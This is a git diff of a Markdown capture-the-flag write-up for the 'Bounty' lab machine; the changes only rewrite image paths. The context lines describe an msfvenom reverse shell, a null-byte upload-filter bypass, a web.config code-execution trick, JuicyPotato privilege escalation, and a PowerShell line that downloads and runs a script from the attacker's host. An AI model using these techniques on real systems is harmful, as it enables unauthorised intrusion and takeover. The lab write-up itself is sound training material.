@@ -13,7 +13,7 @@ picture: /assets/htb-bounty/machine_info.png
 author_profile: true
 ---
 
-![](images/machine_info.png)
+![](/assets/htb-bounty/machine_info.png)
 
 ## Enumeration
 
@@ -35,11 +35,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Navigating to the site gives us only an image of Merlin
 
-![](images/merlin.jpg)
+![](/assets/htb-bounty/merlin.jpg)
 
 Running a scan with `dirsearch` gave me a directory called `/uploadedfiles`, which is directly inaccessible. It also gave me a file called `/transfer.aspx`, which gives a basic browse and upload button.
 
-![](images/transfer_page.png)
+![](/assets/htb-bounty/transfer_page.png)
 
 ---
 
@@ -51,13 +51,13 @@ Being that we have a directory called `/uploadedfiles` and an upload form on `tr
 
 If we try to upload an ASP/ASPX file directly, we get an error telling us it's an invalid file. Same happens with a simple TXT file.
 
-![](images/upload_invalid_file.png)
+![](/assets/htb-bounty/upload_invalid_file.png)
 
 However, if we upload a PNG image, we get a positive result, and can pull up the image from `/uploadedfiles/machine_info.png`
 
-![](images/uploaded_png.png)
+![](/assets/htb-bounty/uploaded_png.png)
 
-![](images/uploaded_info_test.png)
+![](/assets/htb-bounty/uploaded_info_test.png)
 
 So we have a method for uploading images, but how can we weaponize that?
 
@@ -69,11 +69,11 @@ To start, let's make an ASPX reverse shell with `msfvenom -p windows/powershell_
 
 In Burp, we can change the filename in the request to include a null-byte, as shown below. YOu can also see that it worked, and uploaded our file as `shell.aspx` instead of `shell.aspx.png`.
 
-![](images/burp_nullbyte_good.png)
+![](/assets/htb-bounty/burp_nullbyte_good.png)
 
 However, when we try to pull up the shell via our browser, we get a server error. So this method works, but we still don't get code execution that we're looking for.
 
-![](images/nullbyte_servererror.png)
+![](/assets/htb-bounty/nullbyte_servererror.png)
 
 ### web.config
 
@@ -115,11 +115,11 @@ We can now create a local `web.config` file with the below code:
 
 Now that we have everything in place, we can upload `web.config` using the previous method. Once uploaded, navigate to `http://10.10.10.93/uploadedfiles/web.config` to trigger the exploit. When we check our listener, we can see our shell returned as expected, as user `merlin`.
 
-![](images/initial_shell.png)
+![](/assets/htb-bounty/initial_shell.png)
 
 We can grab `user.txt` from `C:\users\merlin\desktop\user.txt`. Note that we can't see the file unless we use `ls -force` to display hidden items.
 
-![](images/user_proof.png)
+![](/assets/htb-bounty/user_proof.png)
 
 ---
 
@@ -129,11 +129,11 @@ We can grab `user.txt` from `C:\users\merlin\desktop\user.txt`. Note that we can
 
 When we run `systeminfo`, we can see some interesting information. First, we're on a Server 2008 R2 server, which we expected. Second, and more importantly, we see that no hotfixes have been applied to the machine. This means we'll likely have our choice of kernel exploits to choose from for privilege escalation.
 
-![](images/systeminfo.png)
+![](/assets/htb-bounty/systeminfo.png)
 
 When we run `whoami /priv`, we can see that `merlin` has the `SeImpersonatePrivilege` setting enabled, which will allow us to use [JuicyPotato](https://ohpe.it/juicy-potato/) for escalation.
 
-![](images/whoami_priv.png)
+![](/assets/htb-bounty/whoami_priv.png)
 
 ### JuicyPotato
 
@@ -155,8 +155,8 @@ powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.20/I
 
 Once all the pieces are in place, we can run the exploit on the target with `./JuicyPotato.exe -t * -p exploit.bat -l 9001`.
 
-![](images/root_shell.png)
+![](/assets/htb-bounty/root_shell.png)
 
 We can grab the `root.txt` flag from `C:\Users\Administrator\Desktop\root.txt`. And it's not hidden this time :-)
 
-![](images/root_proof.png)
+![](/assets/htb-bounty/root_proof.png)
